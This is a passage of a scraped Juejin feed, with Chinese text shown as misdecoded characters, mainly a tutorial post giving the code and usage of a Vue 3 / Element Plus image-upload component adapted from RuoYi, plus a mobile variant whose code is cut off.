<p><strong>æ›´ä¼˜çš„é‡è¦æ€§è¯„ä¼°å‡†åˆ™</strong>ï¼š
è¶…è¶Šç®€å•çš„èŒƒæ•°åˆ¤æ–­ï¼Œé‡‡ç”¨åŸºäºHessiançŸ©é˜µçš„äºŒé˜¶ä¿¡æ¯ã€åŸºäºå½±å“åŠ›çš„åˆ†æç­‰æ›´ç²¾ç¡®çš„è¯„ä¼°æ–¹æ³•ã€‚</p>
</li>
<li>
<p><strong>å¤§è¯­è¨€æ¨¡å‹çš„å‰ªæ</strong>ï¼š
LLMså‚æ•°é‡å·¨å¤§ï¼Œå¯¹å…¶è¿›è¡Œçš„ç»“æ„åŒ–å‰ªæï¼ˆå¦‚æ³¨æ„åŠ›å¤´ã€FFNä¸­é—´ç»´åº¦çš„å‰ªæï¼‰æ˜¯å½“å‰ç ”ç©¶çƒ­ç‚¹ã€‚</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å›¾ç‰‡ä¸Šä¼ ç»„ä»¶]]></title>    <link>https://juejin.cn/post/7600469605476909098</link>    <guid>https://juejin.cn/post/7600469605476909098</guid>    <pubDate>2026-01-29T08:57:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600469605476909098" data-draft-id="7600602502632636457" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å›¾ç‰‡ä¸Šä¼ ç»„ä»¶"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-29T08:57:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åæœˆä¸åˆ°åº•"/> <meta itemprop="url" content="https://juejin.cn/user/3087084382335719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å›¾ç‰‡ä¸Šä¼ ç»„ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3087084382335719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åæœˆä¸åˆ°åº•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:57:54.000Z" title="Thu Jan 29 2026 08:57:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å›¾ç‰‡ä¸Šä¼ ç»„ä»¶</h2>
<p>æ­¤ç»„ä»¶å‚è€ƒè‹¥ä¾åå°ç®¡ç†å›¾ç‰‡ä¸Šä¼ ç»„ä»¶ï¼Œç•¥å¾®ä¿®æ”¹éƒ¨åˆ†é€»è¾‘ï¼Œä½¿å…¶é€‚é…æ›´å¤šåœºæ™¯</p>
<h3 data-id="heading-1">åŸºç¡€ç”¨æ³•</h3>
<p>vue</p>
<pre><code class="hljs language-ruby" lang="ruby">&lt;image-upload v-model=<span class="hljs-string">"form.xxx"</span> <span class="hljs-symbol">:limit=<span class="hljs-string">"9"</span></span> <span class="hljs-symbol">:fileSize=<span class="hljs-string">"10"</span></span> <span class="hljs-symbol">:isShowTip=<span class="hljs-string">"false"</span>&gt;&lt;/image-upload&gt;</span>
</code></pre>
<p>1</p>
<h3 data-id="heading-2">ç»„ä»¶ä»£ç </h3>
<p>åˆ›å»ºç»„ä»¶æ—¶ï¼Œåœ¨<code>components</code>ç›®å½•ä¸‹åˆ›å»º<code>ImageUpload</code>æ–‡ä»¶å¤¹ï¼Œç„¶ååˆ›å»º<code>index.vue</code>ç²˜è´´ç»„ä»¶ä»£ç </p>
<p>vue</p>
<pre><code class="hljs language-ini" lang="ini">&lt;template&gt;
    &lt;div <span class="hljs-attr">class</span>=<span class="hljs-string">"component-upload-image"</span>&gt;
        &lt;el-upload
            multiple
            :<span class="hljs-attr">action</span>=<span class="hljs-string">"uploadImgUrl"</span>
            <span class="hljs-attr">list-type</span>=<span class="hljs-string">"picture-card"</span>
            :<span class="hljs-attr">on-success</span>=<span class="hljs-string">"handleUploadSuccess"</span>
            :<span class="hljs-attr">before-upload</span>=<span class="hljs-string">"handleBeforeUpload"</span>
            :<span class="hljs-attr">limit</span>=<span class="hljs-string">"limit"</span>
            :<span class="hljs-attr">on-error</span>=<span class="hljs-string">"handleUploadError"</span>
            :<span class="hljs-attr">on-exceed</span>=<span class="hljs-string">"handleExceed"</span>
            <span class="hljs-attr">ref</span>=<span class="hljs-string">"imageUpload"</span>
            :<span class="hljs-attr">before-remove</span>=<span class="hljs-string">"handleDelete"</span>
            :<span class="hljs-attr">show-file-list</span>=<span class="hljs-string">"showFileList"</span>
            :<span class="hljs-attr">headers</span>=<span class="hljs-string">"headers"</span>
            :<span class="hljs-attr">file-list</span>=<span class="hljs-string">"fileList"</span>
            :<span class="hljs-attr">on-preview</span>=<span class="hljs-string">"handlePictureCardPreview"</span>
            :<span class="hljs-attr">accept</span>=<span class="hljs-string">"accept"</span>
            :<span class="hljs-attr">class</span>=<span class="hljs-string">"{ hide: fileList.length &gt;= limit &amp;&amp; showFileList, limit1: limit === 1 }"</span>
            :<span class="hljs-attr">data</span>=<span class="hljs-string">"data"</span>
        &gt;
            &lt;slot <span class="hljs-attr">v-if</span>=<span class="hljs-string">"$slots.default"</span>&gt;&lt;/slot&gt;
            &lt;el-icon <span class="hljs-attr">class</span>=<span class="hljs-string">"avatar-uploader-icon"</span> v-else&gt;
                &lt;Plus /&gt;
            &lt;/el-icon&gt;
        &lt;/el-upload&gt;
        &lt;!-- ä¸Šä¼ æç¤º --&gt;
        &lt;div <span class="hljs-attr">class</span>=<span class="hljs-string">"el-upload__tip"</span> v-if=<span class="hljs-string">"showTip"</span>&gt;
            è¯·ä¸Šä¼ 
            &lt;template <span class="hljs-attr">v-if</span>=<span class="hljs-string">"fileSize"</span>&gt;
                å¤§å°ä¸è¶…è¿‡ &lt;b <span class="hljs-attr">style</span>=<span class="hljs-string">"color: #f56c6c"</span>&gt;{{ fileSize }}MB&lt;/b&gt;
            &lt;/template&gt;
            &lt;template <span class="hljs-attr">v-if</span>=<span class="hljs-string">"fileType"</span>&gt;
                æ ¼å¼ä¸º &lt;b <span class="hljs-attr">style</span>=<span class="hljs-string">"color: #f56c6c"</span>&gt;{{ fileType.join(<span class="hljs-string">"/"</span>) }}&lt;/b&gt;
            &lt;/template&gt;
            çš„æ–‡ä»¶
        &lt;/div&gt;

        &lt;!-- &lt;el-dialog <span class="hljs-attr">v-model</span>=<span class="hljs-string">"dialogVisible"</span> title=<span class="hljs-string">"é¢„è§ˆ"</span> width=<span class="hljs-string">"800px"</span> append-to-body&gt;
            &lt;img :<span class="hljs-attr">src</span>=<span class="hljs-string">"dialogImageUrl"</span> style=<span class="hljs-string">"display: block; max-width: 100%; margin: 0 auto"</span> /&gt;
        &lt;/el-dialog&gt; --&gt;
        &lt;el-image-viewer <span class="hljs-attr">v-if</span>=<span class="hljs-string">"dialogVisible"</span> @close=<span class="hljs-string">"closeviewer"</span> :url-list=<span class="hljs-string">"[dialogImageUrl]"</span> /&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { getToken } from "@/utils/auth"<span class="hljs-comment">;</span>
import { Plus } from "@element-plus/icons-vue"<span class="hljs-comment">;</span>
//é€‚é…æ‰‹æœºåšçš„æ›´æ”¹
const <span class="hljs-attr">props</span> = defineProps({
    modelValue: <span class="hljs-section">[String, Object, Array]</span>,
    // å›¾ç‰‡æ•°é‡é™åˆ¶
    limit: {
        type: Number,
        default: 1,
    },
    // å¤§å°é™åˆ¶(MB)
    fileSize: {
        type: Number,
        default: 5,
    },
    // æ–‡ä»¶ç±»å‹, ä¾‹å¦‚<span class="hljs-section">['png', 'jpg', 'jpeg']</span>
    fileType: {
        type: Array,
        default: () =&gt; <span class="hljs-section">["png", "jpg", "jpeg"]</span>,
    },
    // æ˜¯å¦æ˜¾ç¤ºæç¤º
    isShowTip: {
        type: Boolean,
        default: true,
    },
    data: {
        type: Object,
        default: () =&gt; {
            type: "0"<span class="hljs-comment">;</span>
        },
    },
    showFileList: {
        type: Boolean,
        default: true,
    },
})<span class="hljs-comment">;</span>

const { proxy } = getCurrentInstance()<span class="hljs-comment">;</span>
const <span class="hljs-attr">emit</span> = defineEmits()<span class="hljs-comment">;</span>
const <span class="hljs-attr">number</span> = ref(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">uploadList</span> = ref([])<span class="hljs-comment">;</span>
const <span class="hljs-attr">dialogImageUrl</span> = ref(<span class="hljs-string">""</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">dialogVisible</span> = ref(<span class="hljs-literal">false</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">baseUrl</span> = import.meta.env.VITE_APP_BASE_API<span class="hljs-comment">;</span>
const <span class="hljs-attr">uploadImgUrl</span> = ref(import.meta.env.VITE_APP_BASE_API + <span class="hljs-string">"/common/upload"</span>)<span class="hljs-comment">; // ä¸Šä¼ çš„å›¾ç‰‡æœåŠ¡å™¨åœ°å€</span>
const <span class="hljs-attr">headers</span> = ref({ Authorization: <span class="hljs-string">"Bearer "</span> + getToken() })<span class="hljs-comment">;</span>
const <span class="hljs-attr">fileList</span> = ref([])<span class="hljs-comment">;</span>
const <span class="hljs-attr">showTip</span> = computed(() =&gt; props.isShowTip &amp;&amp; (props.fileType || props.fileSize))<span class="hljs-comment">;</span>
const <span class="hljs-attr">accept</span> = computed(() =&gt; props.fileType &amp;&amp; <span class="hljs-string">"."</span> + props.fileType.join(<span class="hljs-string">",."</span>))<span class="hljs-comment">;</span>

watch(
    () =&gt; props.modelValue,
    (val) =&gt; {
        if (val) {
            // é¦–å…ˆå°†å€¼è½¬ä¸ºæ•°ç»„
            const <span class="hljs-attr">list</span> = Array.isArray(val) ? val : props.modelValue.split(<span class="hljs-string">","</span>)<span class="hljs-comment">;</span>
            // ç„¶åå°†æ•°ç»„è½¬ä¸ºå¯¹è±¡æ•°ç»„
            <span class="hljs-attr">fileList.value</span> = list.map((item) =&gt; {
                if (typeof <span class="hljs-attr">item</span> === <span class="hljs-string">"string"</span>) {
                    if (item.indexOf(baseUrl) === -1) {
                        <span class="hljs-attr">item</span> = { name: item, url: item }<span class="hljs-comment">;</span>
                    } else {
                        <span class="hljs-attr">item</span> = { name: item, url: item }<span class="hljs-comment">;</span>
                    }
                }
                return item<span class="hljs-comment">;</span>
            })<span class="hljs-comment">;</span>
        } else {
            <span class="hljs-attr">fileList.value</span> = []<span class="hljs-comment">;</span>
            return <span class="hljs-section">[]</span><span class="hljs-comment">;</span>
        }
    },
    { deep: true, immediate: true }
)<span class="hljs-comment">;</span>

// ä¸Šä¼ å‰loadingåŠ è½½
function handleBeforeUpload(file) {
    let <span class="hljs-attr">isImg</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    if (props.fileType.length) {
        let <span class="hljs-attr">fileExtension</span> = <span class="hljs-string">""</span><span class="hljs-comment">;</span>
        if (file.name.lastIndexOf(".") &gt; -1) {
            <span class="hljs-attr">fileExtension</span> = file.name.slice(file.name.lastIndexOf(<span class="hljs-string">"."</span>) + <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
        }
        <span class="hljs-attr">isImg</span> = props.fileType.some((type) =&gt; {
            if (file.type.indexOf(type) &gt; -1) return true<span class="hljs-comment">;</span>
            if (fileExtension &amp;&amp; fileExtension.indexOf(type) &gt; -1) return true<span class="hljs-comment">;</span>
            return false<span class="hljs-comment">;</span>
        })<span class="hljs-comment">;</span>
    } else {
        <span class="hljs-attr">isImg</span> = file.type.indexOf(<span class="hljs-string">"image"</span>) &gt; -<span class="hljs-number">1</span><span class="hljs-comment">;</span>
    }
    if (!isImg) {
        proxy.$modal.msgError(`æ–‡ä»¶æ ¼å¼ä¸æ­£ç¡®, è¯·ä¸Šä¼ ${props.fileType.join("/")}å›¾ç‰‡æ ¼å¼æ–‡ä»¶!`)<span class="hljs-comment">;</span>
        return false<span class="hljs-comment">;</span>
    }
    if (props.fileSize) {
        const <span class="hljs-attr">isLt</span> = file.size / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &lt; props.fileSize<span class="hljs-comment">;</span>
        if (!isLt) {
            proxy.$modal.msgError(`ä¸Šä¼ å›¾ç‰‡å¤§å°ä¸èƒ½è¶…è¿‡ ${props.fileSize} MB!`)<span class="hljs-comment">;</span>
            return false<span class="hljs-comment">;</span>
        }
    }
    proxy.$modal.loading("æ­£åœ¨ä¸Šä¼ å›¾ç‰‡ï¼Œè¯·ç¨å€™...")<span class="hljs-comment">;</span>
    number.value++<span class="hljs-comment">;</span>
}

// æ–‡ä»¶ä¸ªæ•°è¶…å‡º
function handleExceed(files) {
    // å½“ä¸Šä¼ æ–‡ä»¶ä¸º1ä¸ªä¸”ä¸æ˜¾ç¤ºæ–‡ä»¶åˆ—è¡¨æ—¶ï¼Œè¦†ç›–ä¸Šä¼ æ–‡ä»¶ é€‚é…æ‰‹æœºåšçš„æ›´æ”¹
    if (<span class="hljs-attr">props.limit</span> === <span class="hljs-number">1</span> &amp;&amp; !props.showFileList) {
        // é‡ç½®ä¸Šä¼ çŠ¶æ€
        proxy.$refs.imageUpload.clearFiles()<span class="hljs-comment">;</span>
        <span class="hljs-attr">uploadList.value</span> = []<span class="hljs-comment">;</span>
        <span class="hljs-attr">fileList.value</span> = []<span class="hljs-comment">;</span>
        <span class="hljs-attr">number.value</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>

        // ä¸Šä¼ æ–‡ä»¶
        const <span class="hljs-attr">file</span> = files[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span>
        <span class="hljs-attr">file.uid</span> = Date.now() + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        proxy.$refs.imageUpload.handleStart(file)<span class="hljs-comment">;</span>
        fileList.value.push(file)<span class="hljs-comment">;</span>
        proxy.$refs.imageUpload.submit()<span class="hljs-comment">;</span>
    } else {
        proxy.$modal.msgError(`ä¸Šä¼ æ–‡ä»¶æ•°é‡ä¸èƒ½è¶…è¿‡ ${props.limit} ä¸ª!`)<span class="hljs-comment">;</span>
    }
}

// ä¸Šä¼ æˆåŠŸå›è°ƒ
function handleUploadSuccess(res, file) {
    if (<span class="hljs-attr">res.code</span> == <span class="hljs-number">0</span>) {
        uploadList.value.push({ name: res.fileName, url: res.urlPath })<span class="hljs-comment">;</span>
        uploadedSuccessfully()<span class="hljs-comment">;</span>
    } else {
        number.value--<span class="hljs-comment">;</span>
        proxy.$modal.closeLoading()<span class="hljs-comment">;</span>
        proxy.$modal.msgError(res.msg)<span class="hljs-comment">;</span>
        proxy.$refs.imageUpload.handleRemove(file)<span class="hljs-comment">;</span>
        uploadedSuccessfully()<span class="hljs-comment">;</span>
    }
}

// åˆ é™¤å›¾ç‰‡
function handleDelete(file) {
    const <span class="hljs-attr">findex</span> = fileList.value.map((f) =&gt; f.name).indexOf(file.name)<span class="hljs-comment">;</span>
    if (findex &gt; -1 &amp;&amp; <span class="hljs-attr">uploadList.value.length</span> === number.value) {
        fileList.value.splice(findex, 1)<span class="hljs-comment">;</span>
        emit("update:modelValue", listToString(fileList.value))<span class="hljs-comment">;</span>
        return false<span class="hljs-comment">;</span>
    }
}

// ä¸Šä¼ ç»“æŸå¤„ç†
function uploadedSuccessfully() {
    if (number.value &gt; 0 &amp;&amp; <span class="hljs-attr">uploadList.value.length</span> === number.value) {
        <span class="hljs-attr">fileList.value</span> = fileList.value.filter((f) =&gt; f.url !== undefined).concat(uploadList.value)<span class="hljs-comment">;</span>
        <span class="hljs-attr">uploadList.value</span> = []<span class="hljs-comment">;</span>
        <span class="hljs-attr">number.value</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        emit("update:modelValue", listToString(fileList.value))<span class="hljs-comment">;</span>
        proxy.$modal.closeLoading()<span class="hljs-comment">;</span>
    }
}

// ä¸Šä¼ å¤±è´¥
function handleUploadError() {
    proxy.$modal.msgError("ä¸Šä¼ å›¾ç‰‡å¤±è´¥")<span class="hljs-comment">;</span>
    proxy.$modal.closeLoading()<span class="hljs-comment">;</span>
}

// é¢„è§ˆ
function handlePictureCardPreview(file) {
    <span class="hljs-attr">dialogImageUrl.value</span> = file.url<span class="hljs-comment">;</span>
    <span class="hljs-attr">dialogVisible.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}
// å…³é—­é¢„è§ˆ
function closeviewer() {
    <span class="hljs-attr">dialogVisible.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">dialogImageUrl.value</span> = <span class="hljs-string">""</span><span class="hljs-comment">;</span>
}

// å¯¹è±¡è½¬æˆæŒ‡å®šå­—ç¬¦ä¸²åˆ†éš”
function listToString(list, separator) {
    let <span class="hljs-attr">strs</span> = <span class="hljs-string">""</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">separator</span> = separator || <span class="hljs-string">","</span><span class="hljs-comment">;</span>
    for (let i in list) {
        if (undefined !== list<span class="hljs-section">[i]</span>.url &amp;&amp; list<span class="hljs-section">[i]</span>.url.indexOf("blob:") !== 0) {
            // strs += list<span class="hljs-section">[i]</span>.url.replace(baseUrl, '') + separator<span class="hljs-comment">;</span>
            strs += list<span class="hljs-section">[i]</span>.url + separator<span class="hljs-comment">;</span>
        }
    }
    return strs != "" ? strs.substr(0, strs.length - 1) : ""<span class="hljs-comment">;</span>
}
&lt;/script&gt;

&lt;style scoped <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span>&gt;
// .el-upload--picture-card æ§åˆ¶åŠ å·éƒ¨åˆ†
:deep(.hide .el-upload--picture-card) {
    display: none<span class="hljs-comment">;</span>
}

.limit1 {
    :deep(.el-upload-list__item + .el-upload--picture-card) {
        display: none<span class="hljs-comment">;</span>
    }
    :deep(.el-upload--picture-card) {
        border: none<span class="hljs-comment">;</span>
        background-color: unset<span class="hljs-comment">;</span>
        // --el-upload-picture-card-size: 88px 32px<span class="hljs-comment">;</span>

        i {
            font-size: 28px<span class="hljs-comment">;</span>
            color: var(--el-color-primary)<span class="hljs-comment">;</span>
        }

        .el-upload-dragger {
            height: 100%<span class="hljs-comment">;</span>
            padding: 0px<span class="hljs-comment">;</span>
            display: flex<span class="hljs-comment">;</span>
            justify-content: center<span class="hljs-comment">;</span>
            align-items: center<span class="hljs-comment">;</span>
            // img{
            //     border: 1px dashed <span class="hljs-comment">#ccc;</span>
            // }
        }
    }
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-3">é€‚é…æ‰‹æœºç«¯</h3>
<p>æ–°å¢ä¸€ä¸ªç»„ä»¶<code>by-image-upload</code>å¯¹åŸæ¥çš„<code>image-upload</code>ç»„ä»¶è¿›è¡Œä¼˜åŒ–ä½¿ç”¨ï¼Œä½¿å…¶åœ¨æ‰‹æœºç«¯æ›´å¥½å±•ç¤º</p>
<h4 data-id="heading-4">ä½¿ç”¨åœºæ™¯åŠæ–¹æ³•</h4>
<ul>
<li>åœºæ™¯ä¸€(å•å›¾ç‰‡ä¸Šä¼ ï¼Œæ ·å¼åŠå†…å®¹è‡ªå®šä¹‰ï¼Œä¸æ˜¾ç¤ºå›¾ç‰‡åˆ—è¡¨)</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f74924924a5641dea312178284d255df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5pyI5LiN5Yiw5bqV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281873&amp;x-signature=nHzEbV6QMSkAMUq8797CRa167qw%3D" alt="20240910165825.png" loading="lazy"/></p>
<p>ä½¿ç”¨æ–¹æ³•</p>
<p>vue</p>
<pre><code class="hljs language-ruby" lang="ruby">&lt;by-image-upload v-model=<span class="hljs-string">"form.xxx"</span> <span class="hljs-symbol">:limit=<span class="hljs-string">"1"</span></span> <span class="hljs-symbol">:fileSize=<span class="hljs-string">"10"</span></span> <span class="hljs-symbol">:isShowTip=<span class="hljs-string">"false"</span></span> <span class="hljs-symbol">:show-file-list=<span class="hljs-string">"false"</span>&gt;</span>
    &lt;div style=<span class="hljs-string">"display: flex; flex-direction: column; align-items: center; width: 300px; height: 200px"</span>&gt;
        &lt;img src=<span class="hljs-string">"@/assets/images/zhengjian.png"</span> alt=<span class="hljs-string">""</span> width=<span class="hljs-string">"76"</span> /&gt;
        &lt;span style=<span class="hljs-string">"color: #999"</span>&gt;ç‚¹å‡»ä¸Šä¼ è¡ŒåŒ»èµ„æ ¼è¯ç…§ç‰‡&lt;<span class="hljs-regexp">/span&gt;
    &lt;/div</span>&gt;
    &lt;template <span class="hljs-comment">#preview&gt;</span>
        &lt;div style=<span class="hljs-string">"width: 300px; height: 200px"</span>&gt;
            &lt;img <span class="hljs-symbol">:src=<span class="hljs-string">"form.xxx"</span></span> <span class="hljs-keyword">class</span>=<span class="hljs-string">"avatar"</span> width=<span class="hljs-string">"100%"</span> height=<span class="hljs-string">"100%"</span> /&gt;
        &lt;<span class="hljs-regexp">/div&gt;
    &lt;/template</span>&gt;
&lt;<span class="hljs-regexp">/by-image-upload&gt;
</span></code></pre>
<ul>
<li>åœºæ™¯äºŒ(å¤šå›¾ç‰‡ä¸Šä¼ ï¼Œæ ·å¼æ˜¾ç¤ºé»˜è®¤æ ·å¼ï¼Œæ˜¾ç¤ºå›¾ç‰‡åˆ—è¡¨)</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0728fcef260a4802a7ec12c784cefbbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5pyI5LiN5Yiw5bqV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281873&amp;x-signature=MkyNgjR2dAY1MLVCIKbd0D%2B6SHY%3D" alt="image2.png" loading="lazy"/></p>
<p>ä½¿ç”¨æ–¹æ³•</p>
<p>vue</p>
<pre><code class="hljs language-ruby" lang="ruby">&lt;by-image-upload v-model=<span class="hljs-string">"form.xxx"</span> <span class="hljs-symbol">:limit=<span class="hljs-string">"9"</span></span> <span class="hljs-symbol">:fileSize=<span class="hljs-string">"10"</span></span> <span class="hljs-symbol">:isShowTip=<span class="hljs-string">"false"</span></span> <span class="hljs-keyword">class</span>=<span class="hljs-string">"upload-size"</span> /&gt;
</code></pre>
<p>é€šè¿‡æ·»åŠ  class æ§åˆ¶å›¾ç‰‡æ˜¾ç¤ºå¤§å°</p>
<p>scss</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.upload-size</span> {
    <span class="hljs-attr">--upload-size</span>: <span class="hljs-number">120px</span>;
    :<span class="hljs-built_in">deep</span>(.el-upload--picture-card) {
        <span class="hljs-attr">--el-upload-picture-card-size</span>: <span class="hljs-built_in">var</span>(--upload-size);
    }
    :<span class="hljs-built_in">deep</span>(.el-upload-list__item) {
        <span class="hljs-attr">--el-upload-list-picture-card-size</span>: <span class="hljs-built_in">var</span>(--upload-size);
    }
}
</code></pre>
<h3 data-id="heading-5">é€‚é…æ‰‹æœºç«¯ç»„ä»¶ä»£ç </h3>
<p>åˆ›å»ºç»„ä»¶æ—¶ï¼Œåœ¨<code>components</code>ç›®å½•ä¸‹åˆ›å»º<code>ByImageUpload</code>æ–‡ä»¶å¤¹ï¼Œç„¶ååˆ›å»º<code>index.vue</code>ç²˜è´´ç»„ä»¶ä»£ç </p>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
